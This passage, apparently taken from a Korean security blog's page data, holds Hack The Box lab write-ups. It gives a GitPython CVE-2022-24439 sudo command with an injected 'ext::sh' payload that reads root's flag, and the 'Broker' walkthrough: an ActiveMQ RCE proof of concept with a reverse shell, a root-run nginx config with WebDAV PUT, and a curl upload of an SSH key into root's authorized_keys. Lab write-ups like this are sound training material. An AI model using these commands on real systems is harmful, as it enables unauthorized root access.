작업을 수행한다는 것을 알 수 있는 대목이기 때문에 이 스크립트에서 가장 유용한 정보라고 할 수 있다. \n\n구글에 `from git import Repo` 의 취약점을 검색하면 [CVE-2022-24439](https://nvd.nist.gov/vuln/detail/CVE-2022-24439)에 관한 내용을 찾아볼 수 있고 이를 악용해 권한 상승을 할 수 있다. \n\n나는 https://github.com/gitpython-developers/GitPython/issues/1515 여기와 여기 https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858 를 참고했다. \n\n```sh\nsudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root'\n```\n![](https://velog.velcdn.com/images/h3llanut3lla/post/1e3ee081-6a2c-4fd1-b7d1-ed60143190c5/image.png)\n\n이렇게 `sudo`와 함께 상위 명령어를 입력하면 하면 루트로 권한 상승을 할 수 있다. "},{"excerpt":"Broker 요약  Broker는 Apache ActiveMQ를 호스팅하는 쉬운 난이도의 리눅스 머신이다. \n'Apache ActiveMQ' 버전을 찾아보면 원격 코드 실행 (Unauthenticated Remote Code Execution)에 취약하다는 것을 알 수 있으며 이를 악용해서 타겟 시스템 초입을 할 수 있다. 이후, 권한상승을 위한 정보를 …","fields":{"slug":"/Broker/"},"frontmatter":{"date":"February 07, 2025","title":"Broker","tags":["HTB","sudo-l","리눅스"]},"rawMarkdownBody":"## Broker 요약\n![](https://velog.velcdn.com/images/h3llanut3lla/post/68b13905-0b9c-4d3a-aff0-d787acc4723c/image.png)\n\nBroker는 Apache ActiveMQ를 호스팅하는 쉬운 난이도의 리눅스 머신이다. \n'Apache ActiveMQ' 버전을 찾아보면 원격 코드 실행 (Unauthenticated Remote Code Execution)에 취약하다는 것을 알 수 있으며 이를 악용해서 타겟 시스템 초입을 할 수 있다. 이후, 권한상승을 위한 정보를 얻다보면 잘못된 sudo 구성을 찾을 수 있고, `sudo /usr/sbin/nginx` 를 통해 가장 높은 권한인 root 권한을 얻을 수 있다. 이 방식은 'Zimbra' 취약점 디스클로져와 비슷하다.\n\n## 정보 수집\n### Nmap 포트 스캔\nTCP 스캔내용\n```sh\n└─$ nmap -sC -sV 10.10.11.243                 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-01 13:33 AEST\nNmap scan report for 10.10.11.243\nHost is up (0.016s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\n|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n| http-auth: \n| HTTP/1.1 401 Unauthorized\\x0D\n|_  basic realm=ActiveMQRealm\n|_http-title: Error 401 Unauthorized\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\nHTTP 포트가 열려 있으니 우선 들어가보자. \n\n### 80-HTTP\n![](https://velog.velcdn.com/images/h3llanut3lla/post/38604c0c-c362-4cd4-a2df-e10dfecc5f58/image.png)\n여기에 디폴트 유저네임 `admin` 비밀번호 `admin` 으로 로그인하면 아래와 같이 정확한 버전정보를 확인할 수 있다. \n>Version 5.15.15\n![](https://velog.velcdn.com/images/h3llanut3lla/post/74d467cb-1171-416a-a42d-ceaafee12d08/image.png)\n\n## 초입\n`ActiveMQ 5.15.15 github` 혹은 `ActiveMQ 5.15.15 exploits` 라고 구글에 검색해보면 여러 엑스플로이트들이 나오는데, 나는 그 중 https://github.com/X1r0z/ActiveMQ-RCE/tree/main 이걸 사용했다. \n\n`poc.xml` 파일에 리버스쉘을 넣어주면 된다.\n\n```xml\n<list>\n  <value>여기에 리버스 쉘 입력</value>\n</list>\n```\n\n수정된 `poc.xml`\n![](https://velog.velcdn.com/images/h3llanut3lla/post/491ee409-7cd0-45a2-a996-9f2fac982eea/image.png)\n\n그렇다면 이렇게 타겟에 쉘이 생긴것을 확인할 수 있다 (우측 상단).\n![](https://velog.velcdn.com/images/h3llanut3lla/post/7673de1b-d013-4bbd-986d-66d1b431be92/image.png)\n\n## 권한 상승\n`sudo` 로 사용 가능한 명령어를 확인하기 위해 `sudo -l` 이라고 쳐보면 `/usr/sbin/nginx` 가 권한 상승 없이 쓸 수 있는것을 확인할 수 있다.  \n![](https://velog.velcdn.com/images/h3llanut3lla/post/2f6ed5c9-2163-4c51-bfe9-a3f6e1f88b19/image.png)\n\n`nginx` 헬프 페이지를 보면 친절하게도 아래와 같이 버전정보를 확인할 수 있다. \n![](https://velog.velcdn.com/images/h3llanut3lla/post/d40d38a9-a20a-4327-9f97-8ec02b03b47f/image.png)\n\n[Zimbra 디스클로져](https://github.com/advisories/GHSA-w7p3-hmmp-qmx6)와 같은 방식으로 진행해보자. \n\n`nginx` 구성파일중 `user-www-data` 라고 작성되어 있는 부분을 `root` 로 바꿔주면 된다. \n![](https://velog.velcdn.com/images/h3llanut3lla/post/0c303d62-bd24-4a0e-8f86-00da12b5c4c8/image.png)\n\n아래와 같은 `pwn.conf` 라는 새 구성파일을 만들어준다.\n```sh\nuser root; # 워커 프로세스가 root 권한으로 실행\nworker_processes 4;\npid /tmp/nginx.pid;\nevents {\n\t\tworker_connections 768;\n}\nhttp {\n\tserver {\n\t\tlisten 1337;\n\t\troot /;\n\t\tautoindex on;\n\t\tdav_methods PUT;\n\t}\n}\n```\n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/b7b868a1-578b-4de5-bfd0-b0cdab7c91dd/image.png)\n새로 만든 `pwn.conf` 가 잘 실행되었는지 확인하기 위해, 열린 포트를 보면 아래와 같이 포트 1337이 열린것을 볼 수 있다. \n![](https://velog.velcdn.com/images/h3llanut3lla/post/906e1180-82e5-4365-b8c5-7a05a351eb05/image.png)\n\n그럼 이제 `/root/.ssh/authorized_keys` 에 대한 공개 SSH키를 만들어보자. \n![](https://velog.velcdn.com/images/h3llanut3lla/post/7700d7cb-b3f7-4e86-a8b8-5df4cc597c84/image.png)\n\n칼리에서 \n```sh\n# SSH키 생성\nssh-keygen -f broker\n\n# 생성된 키를 타겟에 전달\ncurl 10.10.11.243:1337/root/.ssh/authorized_keys --upload-file broker.pub\n```\n\n그리고 키를 이용해 SSH로 접속하면\n```sh\nssh -i broker root@10.10.11.243\n```\n![](https://velog.velcdn.com/images/h3llanut3lla/post/f5039481-5ee3-4380-9be3-b14aed525772/image.png)\n\n`root`로 권한이 상승된것을 확인할 수 있다. "}]}},"pageContext":{}},"staticQueryHashes":[],"slicesMap":{}}